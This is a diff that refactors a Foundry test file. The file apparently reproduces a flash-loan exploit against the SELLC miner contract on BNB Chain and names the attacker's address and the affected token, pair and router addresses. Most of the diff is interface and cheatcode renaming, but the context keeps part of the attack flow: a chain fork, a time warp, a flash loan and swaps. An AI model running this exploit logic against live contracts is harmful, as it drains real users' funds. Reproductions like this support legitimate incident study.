@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : unclear US$
 // Attacker : https://bscscan.com/address/0x0060129430df7ea188be3d8818404a2d40896089
@@ -31,18 +30,17 @@ contract ContractTest is Test {
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
     Miner miner = Miner(0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1);
-    Uni_Pair_V2 SELLC_USDT = Uni_Pair_V2(0x9523B023E1D2C490c65D26fad3691b024d0305D7);
-    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Pair SELLC_USDT = IUniswapV2Pair(0x9523B023E1D2C490c65D26fad3691b024d0305D7);
+    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     IDPPOracle oracle = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 29_005_754);
-        cheats.label(address(WBNB), "WBNB");
-        cheats.label(address(USDT), "USDT");
-        cheats.label(address(SELLC), "SELLC");
-        cheats.label(address(SELLC_USDT), "SELLC_USDT");
-        cheats.label(address(Router), "Router");
+        vm.createSelectFork("bsc", 29_005_754);
+        vm.label(address(WBNB), "WBNB");
+        vm.label(address(USDT), "USDT");
+        vm.label(address(SELLC), "SELLC");
+        vm.label(address(SELLC_USDT), "SELLC_USDT");
+        vm.label(address(Router), "Router");
         WBNB.approve(address(Router), type(uint256).max);
         USDT.approve(address(Router), type(uint256).max);
         SELLC.approve(address(Router), type(uint256).max);
@@ -51,7 +49,7 @@ contract ContractTest is Test {
 
     function testExploit() public {
         miner.setBNB{value: 0.01 ether}(address(SELLC), address(USDT));
-        cheats.warp(block.timestamp + 1 * 86_400 + 1);
+        vm.warp(block.timestamp + 1 * 86_400 + 1);
         oracle.flashLoan(600 * 1e18, 0, address(this), new bytes(1));
         emit log_named_decimal_uint(
             "[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
@@ -68,7 +66,7 @@ contract ContractTest is Test {
         path[0] = address(SELLC);
         path[1] = address(USDT);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            SELLC.balanceOf(address(this)) * 1 / 100, 0, path, address(this), block.timestamp
+            (SELLC.balanceOf(address(this)) * 1) / 100, 0, path, address(this), block.timestamp
         );
         Router.addLiquidity(
             address(SELLC),
